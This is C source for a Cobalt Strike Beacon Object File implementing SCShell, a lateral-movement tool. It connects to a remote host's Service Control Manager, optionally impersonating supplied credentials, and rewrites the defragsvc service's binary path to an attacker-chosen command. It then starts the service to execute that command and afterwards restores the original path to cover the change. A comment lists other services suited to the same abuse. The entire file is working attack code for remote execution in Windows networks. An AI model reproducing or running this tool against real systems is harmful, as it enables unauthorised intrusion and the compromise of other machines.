// Author: Mr.Un1k0d3r RingZer0 Team

#include <windows.h>
#include <stdio.h>
#include "beacon.h"

WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$RevertToSelf(VOID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LogonUserW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceConfigW(SC_HANDLE, LPQUERY_SERVICE_CONFIGW, DWORD, LPDWORD);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ChangeServiceConfigW(SC_HANDLE, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE,DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char * args, int length) {
    // Parse Beacon Arguments
    datap parser;
    wchar_t* targetHost;
    wchar_t* serviceName;
    wchar_t* commandline;
    wchar_t* username;
    wchar_t* password;
    wchar_t* domain;

    // serviceName = L"";
    targetHost = L"";
    commandline    = L"";
    username   = L"";
    password   = L"";
    domain     = L"";

    BeaconDataParse(&parser, args, length);
    targetHost = (wchar_t*)BeaconDataExtract(&parser, NULL);
    commandline    = (wchar_t*)BeaconDataExtract(&parser, NULL);
    domain     = (wchar_t*)BeaconDataExtract(&parser, NULL);
    username   = (wchar_t*)BeaconDataExtract(&parser, NULL);
    password   = (wchar_t*)BeaconDataExtract(&parser, NULL);
    
    /**
     * This can be changed. 
     * Common services that work well with SCShell:
     * 
     * defragsvc - Disk Defragmentation Service
     * spooler - Print Spooler
     * SensorService - Server to manage sensors.
     * SessionEnv - Remote Desktop Configuration
     * IKEEXT - IKE and AuthIP IPsec Keying Modules
     * 
    */
    serviceName = L"defragsvc";

    /* Impersonate user if credentials are provided */
    HANDLE    hLogonToken           = NULL;
    BOOL      impersonating         = FALSE;
    LPCWSTR   domainForLogon        = NULL;

    if (username && username[0] && password && password[0]) {
        if (domain && domain[0])
            domainForLogon = domain;
        /* NEW_CREDENTIALS: creds apply to outbound network connections (e.g. remote SCM RPC). */
        if (!ADVAPI32$LogonUserW(username, domainForLogon, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hLogonToken)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LogonUserW failed: %ld\n", KERNEL32$GetLastError());
            goto cleanup;
        }
        if (!ADVAPI32$ImpersonateLoggedOnUser(hLogonToken)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser failed: %ld\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hLogonToken);
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using explicit credentials: %ls\\%ls\n", domain, username);
        impersonating = TRUE;
    }

    /* Open SC Manager and Service */
    LPQUERY_SERVICE_CONFIGW lpqsc   = NULL;
    DWORD     dwLpqscSize           = 0;
    wchar_t*  originalBinaryPath    = NULL;
    BOOL      bResult               = FALSE;
    SC_HANDLE schManager            = NULL;
    SC_HANDLE schService            = NULL;
    

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying to connect to %ls\n", targetHost);

    schManager = ADVAPI32$OpenSCManagerW(targetHost, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_ALL_ACCESS);
    if (schManager == NULL) 
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManagerW failed: %ld\n", KERNEL32$GetLastError());
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SC_HANDLE Manager: 0x%p\n", schManager);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opening service: %ls\n", serviceName);

    schService = ADVAPI32$OpenServiceW(schManager, serviceName, SERVICE_ALL_ACCESS);
    if (schService == NULL) 
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenServiceW failed: %ld\n", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(schManager);
        schManager = NULL;
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SC_HANDLE Service: 0x%p\n", schService);

    DWORD dwSize = 0;
    ADVAPI32$QueryServiceConfigW(schService, NULL, 0, &dwSize);
    
    if (dwSize)
    {
        dwLpqscSize = dwSize;
        lpqsc       = KERNEL32$GlobalAlloc(GPTR, dwSize);
        bResult     = FALSE;
        bResult     = ADVAPI32$QueryServiceConfigW(schService, lpqsc, dwLpqscSize, &dwSize);
        
        if (bResult)
        {
            originalBinaryPath = lpqsc->lpBinaryPathName;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Original service binary path: \"%ls\"\n", originalBinaryPath);
        }
    }

    bResult = FALSE;
    bResult = ADVAPI32$ChangeServiceConfigW(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, commandline, NULL, NULL, NULL, NULL, NULL, NULL);
    
    if (!bResult)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] ChangeServiceConfigW failed to update the service path: %ld\n", KERNEL32$GetLastError());
        KERNEL32$GlobalFree(lpqsc);
        ADVAPI32$CloseServiceHandle(schService);
        schService = NULL;
        ADVAPI32$CloseServiceHandle(schManager);
        schManager = NULL;
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Service path was changed to: \"%ls\"\n", commandline);

    bResult        = FALSE;
    bResult        = ADVAPI32$StartServiceW(schService, 0, NULL);
    DWORD dwResult = KERNEL32$GetLastError();
    
    if (!bResult && dwResult != 1053)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] StartServiceW failed to start the service: %ld\n", dwResult);
    } 
    else 
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service was started\n");
    }

    if (dwLpqscSize && originalBinaryPath)
    {
        bResult = FALSE;
        bResult = ADVAPI32$ChangeServiceConfigW(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        
        if(!bResult) 
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] ChangeServiceConfigW failed to revert the service path: %ld\n", KERNEL32$GetLastError());
        } 
        else 
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Service path was restored to: \"%ls\"\n", originalBinaryPath);
        }
    }

    KERNEL32$GlobalFree(lpqsc);
    lpqsc = NULL;
    if (schService)
        ADVAPI32$CloseServiceHandle(schService);
    if (schManager)
        ADVAPI32$CloseServiceHandle(schManager);

cleanup:
    if (impersonating) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Reverting to self\n");
        ADVAPI32$RevertToSelf();
    }
    if (hLogonToken)
        KERNEL32$CloseHandle(hLogonToken);
}